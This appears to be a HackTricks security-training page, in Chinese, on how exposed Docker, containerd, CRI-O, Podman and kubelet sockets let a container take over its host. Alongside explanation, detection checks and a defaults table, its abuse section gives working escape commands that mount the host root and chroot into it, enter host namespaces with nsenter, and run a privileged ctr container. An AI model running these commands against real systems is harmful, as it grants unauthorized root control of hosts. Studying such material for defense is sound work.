# 运行时 API 与 守护进程 暴露

{{#include ../../../banners/hacktricks-training.md}}

## 概述

许多实际的容器入侵并非始于 namespace 逃逸。它们是从对运行时控制面（runtime control plane）的访问开始的。如果一个工作负载能通过挂载的 Unix socket 或暴露的 TCP 监听器与 `dockerd`、`containerd`、CRI-O、Podman 或 kubelet 通信，攻击者可能能够请求一个具有更高权限的新容器、挂载主机文件系统、加入主机命名空间，或检索敏感的节点信息。在这些情况下，runtime API 才是真正的安全边界，攻破它在功能上几乎等同于攻破主机。

这就是为什么 runtime socket 的暴露应当与内核防护分开记录。即使容器具有常规的 seccomp、capabilities 和 MAC 限制，如果在容器内挂载了 `/var/run/docker.sock` 或 `/run/containerd/containerd.sock`，仍然可能只需一次 API 调用就能导致主机被攻破。当前容器的内核隔离可能完全按设计工作，而运行时管理平面却仍然完全暴露。

## 守护进程访问模型

Docker Engine 传统上通过本地 Unix socket `unix:///var/run/docker.sock` 暴露其特权 API。历史上它也曾通过诸如 `tcp://0.0.0.0:2375` 的 TCP 监听器或在 `2376` 上的 TLS 保护监听器进行远程暴露。如果在没有强 TLS 和客户端认证的情况下将守护进程远程暴露，实际上会把 Docker API 变成一个远程 root 接口。

containerd、CRI-O、Podman 和 kubelet 也暴露了类似的高影响面。名字和工作流可能不同，但逻辑相同。如果接口允许调用者创建工作负载、挂载主机路径、检索凭据或更改正在运行的容器，则该接口就是一个特权管理通道，应当相应地对待。

值得检查的常见本地路径包括：
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
较旧或更专用的堆栈也可能暴露诸如 `dockershim.sock`、`frakti.sock` 或 `rktlet.sock` 之类的端点。这些在现代环境中较少见，但一旦遇到也应以同样的谨慎对待，因为它们代表的是运行时控制面而不是普通的应用套接字。

## 安全远程访问

如果必须将守护进程暴露到本地套接字之外，连接应使用 TLS 保护，最好采用双向认证以便守护进程验证客户端，同时客户端也验证守护进程。出于方便而将 Docker daemon 以明文 HTTP 暴露的旧习惯是容器管理中最危险的错误之一，因为其 API 面暴露足以直接创建特权容器。

历史上的 Docker 配置模式如下所示：
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
在基于 systemd 的主机上，daemon 的通信也可能以 `fd://` 形式出现，这意味着该进程继承了 systemd 预先打开的 socket，而不是自己直接绑定。关键不是精确的语法，而是其安全后果。一旦 daemon 在严格权限的本地 socket 之外进行监听，transport security 和 client authentication 就变成必须的，而不是可选的加固措施。

## Abuse

如果存在 runtime socket，请确认它是哪一个、是否存在兼容的 client，以及是否可以进行 raw HTTP 或 gRPC 访问：
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
这些命令很有用，因为它们可以区分已失效的路径、已挂载但不可访问的 socket，以及活动的特权 API。如果客户端成功，接下来的问题是该 API 是否能够以 host bind mount 或 host namespace 共享的方式启动一个新的容器。

### 完整示例：Docker Socket To Host Root

如果 `docker.sock` 可访问，经典的逃逸方法是启动一个新的容器，挂载主机根文件系统，然后使用 `chroot` 进入它：
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
这通过 Docker daemon 提供了直接在主机 root 上执行的能力。影响不仅限于读取文件。一旦进入新的容器，攻击者可以修改主机文件、窃取凭证、植入 persistence，或启动其他具有特权的工作负载。

### 完整示例: Docker Socket To Host Namespaces

如果攻击者更倾向于进入 namespace 而不是仅限文件系统访问：
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
这种路径不是通过利用当前容器来到达宿主机，而是通过请求 runtime 创建一个带有显式 host-namespace 暴露的新容器。

### 完整示例：containerd Socket

挂载的 `containerd` socket 通常同样危险：
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
影响仍然是主机被攻破。即使缺少 Docker 特定的工具，其他运行时 API 仍可能提供相同的管理权限。

## Checks

这些检查的目标是判断容器是否能够访问任何本应位于信任边界之外的管理平面。
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
这里有几点值得注意：

- 已挂载的运行时套接字通常是一个直接的管理原语，而不是单纯的信息披露。
- 在端口 `2375` 上的 TCP 监听（无 TLS）应被视为远程被攻陷的条件。
- 像 `DOCKER_HOST` 这样的环境变量通常表明该工作负载被设计为与主机运行时通信。

## 运行时默认值

| 运行时 / 平台 | 默认状态 | 默认行为 | 常见的手动弱化 |
| --- | --- | --- | --- |
| Docker Engine | 默认使用本地 Unix 套接字 | `dockerd` 在本地套接字上监听，守护进程通常以 root 权限运行 | 挂载 `/var/run/docker.sock`、暴露 `tcp://...:2375`、在 `2376` 上 TLS 弱或缺失 |
| Podman | 默认无守护进程的 CLI | 普通本地使用不需要长期存在的特权守护进程；当启用 `podman system service` 时，API 套接字仍可能被暴露 | 暴露 `podman.sock`、广泛运行该服务、以 root 权限使用 API |
| containerd | 本地特权套接字 | 通过本地套接字暴露管理 API，且通常被更高级别的工具消费 | 挂载 `containerd.sock`、广泛的 `ctr` 或 `nerdctl` 访问、暴露特权命名空间 |
| CRI-O | 本地特权套接字 | CRI 端点旨在供节点本地受信任的组件使用 | 挂载 `crio.sock`、向不受信任的工作负载暴露 CRI 端点 |
| Kubernetes kubelet | 节点本地的管理 API | Kubelet 不应被 Pod 广泛访问；根据 authn/authz，访问可能会暴露 pod 状态、凭证和执行功能 | 挂载 kubelet 套接字或证书、弱的 kubelet 认证、主机网络加上可访问的 kubelet 端点 |
